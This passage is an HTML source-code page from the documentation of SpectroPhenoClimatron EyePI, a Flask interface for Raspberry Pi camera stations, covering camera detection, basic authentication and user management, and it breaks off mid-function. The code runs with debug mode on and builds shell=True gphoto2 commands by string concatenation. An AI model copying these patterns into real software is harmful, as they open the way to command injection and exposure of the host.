@@ -1,0 +1,1100 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>webinterface &#8212; SpectroPhenoClimatron EyePI 3.2 documentation</title>
+    
+    <link rel="stylesheet" href="../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../',
+        VERSION:     '3.2',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true,
+        SOURCELINK_SUFFIX: '.txt'
+      };
+    </script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+   
+  <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head>
+  <body role="document">
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <h1>Source code for webinterface</h1><div class="highlight"><pre>
+<span></span><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">fnmatch</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">dbm</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">from</span> <span class="nn">jinja2</span> <span class="k">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">FileSystemLoader</span>
+<span class="kn">from</span> <span class="nn">configparser</span> <span class="k">import</span> <span class="n">ConfigParser</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="k">import</span> <span class="n">datetime</span>
+<span class="kn">from</span> <span class="nn">functools</span> <span class="k">import</span> <span class="n">wraps</span>
+<span class="kn">from</span> <span class="nn">glob</span> <span class="k">import</span> <span class="n">glob</span>
+
+<span class="kn">from</span> <span class="nn">werkzeug.wsgi</span> <span class="k">import</span> <span class="n">DispatcherMiddleware</span>
+<span class="kn">from</span> <span class="nn">werkzeug.serving</span> <span class="k">import</span> <span class="n">run_simple</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="k">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> \
+    <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask.ext.bcrypt</span> <span class="k">import</span> <span class="n">Bcrypt</span>
+
+<span class="kn">from</span> <span class="nn">libs.Camera</span> <span class="k">import</span> <span class="o">*</span>
+
+<span class="kn">import</span> <span class="nn">browsepy</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="c1"># generate a new machine id if one does not already exist</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">):</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemd-machine-id-setup&quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chown -R tor:tor /home/tor_private &quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chown -R tor:tor /var/lib/tor &quot;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;something went wrong, oh well...&quot;</span><span class="p">)</span>
+
+<span class="n">browsepy</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
+    <span class="n">APPLICATION_ROOT</span><span class="o">=</span><span class="s2">&quot;/filesystem&quot;</span><span class="p">,</span>
+    <span class="n">directory_base</span><span class="o">=</span><span class="s2">&quot;/home/images&quot;</span><span class="p">,</span>
+    <span class="n">directory_start</span><span class="o">=</span><span class="s2">&quot;/home/images&quot;</span><span class="p">,</span>
+    <span class="n">directory_remove</span><span class="o">=</span><span class="s2">&quot;/home/images&quot;</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;/static&#39;</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="n">bcrypt</span> <span class="o">=</span> <span class="n">Bcrypt</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostname</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;VorvadossTwo&quot;</span><span class="p">:</span>
+    <span class="n">kmsghandler</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">FileHandler</span><span class="p">(</span><span class="s2">&quot;/dev/kmsg&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">kmsghandler</span><span class="p">)</span>
+
+
+<div class="viewcode-block" id="setup_ap"><a class="viewcode-back" href="../webinterface.html#webinterface.setup_ap">[docs]</a><span class="k">def</span> <span class="nf">setup_ap</span><span class="p">():</span>
+    <span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">FileSystemLoader</span><span class="p">(</span><span class="s1">&#39;templates&#39;</span><span class="p">))</span>
+    <span class="n">template</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">get_template</span><span class="p">(</span><span class="s2">&quot;createap&quot;</span><span class="p">)</span>
+    <span class="n">interface</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;ip link | cut -c4- | grep ^w | sed &#39;s/:.*//&#39;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+    <span class="c1"># Enumerates ip link, removes first 4 characters, filters lines that start with w then removes text following &#39;:&#39;</span>
+    <span class="n">netprofile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/usr/lib/systemd/system/create_ap.service&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+    <span class="n">netprofile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">interface</span><span class="o">=</span><span class="n">interface</span><span class="p">))</span>
+    <span class="n">netprofile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Starting AP&quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl start create_ap.service&quot;</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="sanitizeconfig"><a class="viewcode-back" href="../webinterface.html#webinterface.sanitizeconfig">[docs]</a><span class="k">def</span> <span class="nf">sanitizeconfig</span><span class="p">(</span><span class="n">towriteconfig</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    This will eventually do checking of the config file.</span>
+<span class="sd">    it currently just writes a config file to a filename.</span>
+<span class="sd">    :param towriteconfig:</span>
+<span class="sd">    :param filename:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">configfile</span><span class="p">:</span>
+        <span class="n">towriteconfig</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">configfile</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="get_time"><a class="viewcode-back" href="../webinterface.html#webinterface.get_time">[docs]</a><span class="k">def</span> <span class="nf">get_time</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    gets a time string from the current time.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">))</span></div>
+
+
+<div class="viewcode-block" id="get_hostname"><a class="viewcode-back" href="../webinterface.html#webinterface.get_hostname">[docs]</a><span class="k">def</span> <span class="nf">get_hostname</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    returns the hostname of the system as a string.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">gethostname</span><span class="p">())</span></div>
+
+
+<div class="viewcode-block" id="get_version"><a class="viewcode-back" href="../webinterface.html#webinterface.get_version">[docs]</a><span class="k">def</span> <span class="nf">get_version</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    gets the current git version of spc-eyepi</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s2">&quot;/usr/bin/git describe --always&quot;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span></div>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span><span class="o">.</span><span class="n">globals</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">get_time</span><span class="o">=</span><span class="n">get_time</span><span class="p">)</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span><span class="o">.</span><span class="n">globals</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">get_hostname</span><span class="o">=</span><span class="n">get_hostname</span><span class="p">)</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span><span class="o">.</span><span class="n">globals</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="n">get_version</span><span class="p">())</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+<div class="viewcode-block" id="geteosserialnumber"><a class="viewcode-back" href="../webinterface.html#webinterface.geteosserialnumber">[docs]</a><span class="k">def</span> <span class="nf">geteosserialnumber</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    this is meant to get the eosserialnumber (or really any serial number that is associated with the camera)</span>
+<span class="sd">    needs a rework so that it is more consistent across cameras.</span>
+<span class="sd">    :param port:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">cmdret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">&#39;gphoto2 --port &quot;&#39;</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="s1">&#39;&quot; --get-config eosserialnumber&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">cmdret</span><span class="p">[</span><span class="n">cmdret</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Current: &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">9</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmdret</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span></div>
+
+
+<div class="viewcode-block" id="detect_cameras"><a class="viewcode-back" href="../webinterface.html#webinterface.detect_cameras">[docs]</a><span class="k">def</span> <span class="nf">detect_cameras</span><span class="p">(</span><span class="nb">type</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    detects DSLRS attached to the pi</span>
+<span class="sd">    :param type:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&quot;gphoto2 --auto-detect&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">cams</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="s2">&quot;usb:&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
+            <span class="n">cmdret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span>
+                <span class="s1">&#39;gphoto2 --port &quot;&#39;</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="n">port</span><span class="o">.</span><span class="n">start</span><span class="p">():</span><span class="n">port</span><span class="o">.</span><span class="n">end</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;&quot; --get-config serialnumber&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+            <span class="n">cams</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">port</span><span class="o">.</span><span class="n">start</span><span class="p">():</span><span class="n">port</span><span class="o">.</span><span class="n">end</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]]</span> <span class="o">=</span> <span class="n">cmdret</span><span class="p">[</span><span class="n">cmdret</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Current: &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">9</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmdret</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+        <span class="k">return</span> <span class="n">cams</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></div>
+
+
+<div class="viewcode-block" id="check_auth"><a class="viewcode-back" href="../webinterface.html#webinterface.check_auth">[docs]</a><span class="k">def</span> <span class="nf">check_auth</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Authentication validation.</span>
+<span class="sd">    would be better with bcrypt, but it doesnt actually matter.</span>
+<span class="sd">    :param username:</span>
+<span class="sd">    :param password:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">ubytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="n">dbm</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;db&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ubytes</span> <span class="ow">in</span> <span class="n">db</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">check_password_hash</span><span class="p">(</span><span class="n">db</span><span class="p">[</span><span class="n">ubytes</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span> <span class="n">password</span><span class="p">):</span>
+            <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="kc">False</span></div>
+
+
+<div class="viewcode-block" id="requires_auth"><a class="viewcode-back" href="../webinterface.html#webinterface.requires_auth">[docs]</a><span class="k">def</span> <span class="nf">requires_auth</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">decorated</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">auth</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">authorization</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">auth</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">check_auth</span><span class="p">(</span><span class="n">auth</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">auth</span><span class="o">.</span><span class="n">password</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">authenticate</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">decorated</span></div>
+
+
+<span class="nd">@browsepy</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">before_request</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="require_login"><a class="viewcode-back" href="../webinterface.html#webinterface.require_login">[docs]</a><span class="k">def</span> <span class="nf">require_login</span><span class="p">():</span>
+    <span class="k">return</span></div>
+
+
+<div class="viewcode-block" id="authenticate"><a class="viewcode-back" href="../webinterface.html#webinterface.authenticate">[docs]</a><span class="k">def</span> <span class="nf">authenticate</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    really this should just return a 404 for it to be really secure.</span>
+<span class="sd">    But I use the message sometimes.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Access DENIED!&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;WWW-Authenticate&#39;</span><span class="p">:</span> <span class="s1">&#39;Basic realm=&quot;Login Required&quot;&#39;</span><span class="p">})</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<div class="viewcode-block" id="not_found"><a class="viewcode-back" href="../webinterface.html#webinterface.not_found">[docs]</a><span class="k">def</span> <span class="nf">not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;page_not_found.html&#39;</span><span class="p">),</span> <span class="mi">404</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+<div class="viewcode-block" id="server_error"><a class="viewcode-back" href="../webinterface.html#webinterface.server_error">[docs]</a><span class="k">def</span> <span class="nf">server_error</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;server_error.html&#39;</span><span class="p">),</span> <span class="mi">500</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
+<div class="viewcode-block" id="bad_auth"><a class="viewcode-back" href="../webinterface.html#webinterface.bad_auth">[docs]</a><span class="k">def</span> <span class="nf">bad_auth</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;bad_auth.html&#39;</span><span class="p">),</span> <span class="mi">401</span></div>
+
+
+<div class="viewcode-block" id="add_user"><a class="viewcode-back" href="../webinterface.html#webinterface.add_user">[docs]</a><span class="k">def</span> <span class="nf">add_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password_to_set</span><span class="p">,</span> <span class="n">adminpass</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    creates a new user on the pi.</span>
+<span class="sd">    checks to see whether the user is an admin.</span>
+<span class="sd">    also checks to see whether the user is trying to change their own password.</span>
+<span class="sd">    :param username:</span>
+<span class="sd">    :param password_to_set:</span>
+<span class="sd">    :param adminpass:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="n">password_to_set</span><span class="p">)</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="n">dbm</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;db&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">)</span>
+    <span class="c1"># later only allow users control over their own password and admin to add later.</span>
+    <span class="c1"># allow global admin password to change everything.</span>
+    <span class="k">if</span> <span class="n">b</span><span class="s1">&#39;admin&#39;</span> <span class="ow">in</span> <span class="n">db</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">check_password_hash</span><span class="p">(</span><span class="n">db</span><span class="p">[</span><span class="n">b</span><span class="s1">&#39;admin&#39;</span><span class="p">],</span> <span class="n">adminpass</span><span class="p">):</span>
+        <span class="n">db</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hash</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+    <span class="c1"># for each username, only allow the correct hash to change the password</span>
+    <span class="k">for</span> <span class="n">username_</span><span class="p">,</span> <span class="n">hash_</span> <span class="ow">in</span> <span class="n">db</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">username_</span> <span class="ow">in</span> <span class="n">db</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">check_password_hash</span><span class="p">(</span><span class="n">hash_</span><span class="p">,</span> <span class="n">adminpass</span><span class="p">):</span>
+            <span class="n">db</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hash</span>
+            <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kc">False</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/imgs/&lt;path:path&gt;&quot;</span><span class="p">)</span>
+<div class="viewcode-block" id="get_image"><a class="viewcode-back" href="../webinterface.html#webinterface.get_image">[docs]</a><span class="k">def</span> <span class="nf">get_image</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="k">if</span> <span class="s1">&#39;..&#39;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="n">path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">):</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;static&quot;</span><span class="p">,</span> <span class="s2">&quot;temp&quot;</span><span class="p">,</span> <span class="n">path</span> <span class="o">+</span> <span class="s2">&quot;.jpg&quot;</span><span class="p">))</span></div>
+
+
+<div class="viewcode-block" id="cap_lock_wait"><a class="viewcode-back" href="../webinterface.html#webinterface.cap_lock_wait">[docs]</a><span class="k">def</span> <span class="nf">cap_lock_wait</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">serialnumber</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span>
+            <span class="s2">&quot;gphoto2 --port=&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; --capture-preview --force-overwrite --filename=&#39;static/temp/&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span>
+                <span class="n">serialnumber</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;.jpg&#39;&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">output</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">True</span></div>
+
+
+<div class="viewcode-block" id="capture_preview"><a class="viewcode-back" href="../webinterface.html#webinterface.capture_preview">[docs]</a><span class="k">def</span> <span class="nf">capture_preview</span><span class="p">(</span><span class="n">serialnumber</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&quot;gphoto2 --auto-detect&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="s2">&quot;usb:&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
+            <span class="n">port</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">port</span><span class="o">.</span><span class="n">start</span><span class="p">():</span><span class="n">port</span><span class="o">.</span><span class="n">end</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span>
+            <span class="n">cmdret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">&#39;gphoto2 --port &quot;&#39;</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="s1">&#39;&quot; --get-config serialnumber&#39;</span><span class="p">,</span>
+                                             <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+            <span class="n">_serialnumber</span> <span class="o">=</span> <span class="n">cmdret</span><span class="p">[</span><span class="n">cmdret</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Current: &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">9</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmdret</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+            <span class="k">if</span> <span class="n">_serialnumber</span> <span class="o">==</span> <span class="n">serialnumber</span><span class="p">:</span>
+                <span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>
+                <span class="k">while</span> <span class="n">tries</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="ow">and</span> <span class="n">cap_lock_wait</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">serialnumber</span><span class="p">):</span>
